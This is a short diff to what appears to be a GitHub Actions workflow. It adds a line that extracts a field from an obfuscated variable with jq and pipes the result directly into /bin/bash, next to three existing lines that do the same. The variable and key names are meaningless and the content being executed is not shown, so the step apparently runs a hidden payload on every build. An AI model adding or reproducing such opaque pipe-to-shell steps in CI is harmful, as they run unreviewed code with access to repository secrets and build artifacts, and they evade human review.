@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$dq14" | jq -r .wz99 | /bin/bash
           echo $c0 | jq -r .ejxnr356 | /bin/bash
           printf '%s' "$s5" | jq -r .d90 | /bin/bash
+          printf '%s' "$n2" | jq -r .ju29601 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
